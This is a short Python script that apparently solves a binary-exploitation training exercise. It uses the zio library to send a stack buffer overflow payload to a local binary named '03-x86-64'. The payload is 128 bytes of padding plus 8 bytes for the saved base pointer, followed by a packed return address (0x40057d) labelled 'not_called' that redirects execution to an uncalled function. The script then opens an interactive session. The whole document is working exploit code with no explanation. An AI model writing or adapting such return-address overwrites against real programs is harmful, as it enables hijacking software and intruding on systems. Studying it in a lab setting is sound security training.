#!/usr/bin/python

import struct

from zio import *

payload = 'a' * 128                    # buffer
payload += 'b' * 8                     # old rbp
payload += struct.pack('<Q', 0x40057d) # not_called address

io = zio("./03-x86-64")
io.write(payload)
io.interact()
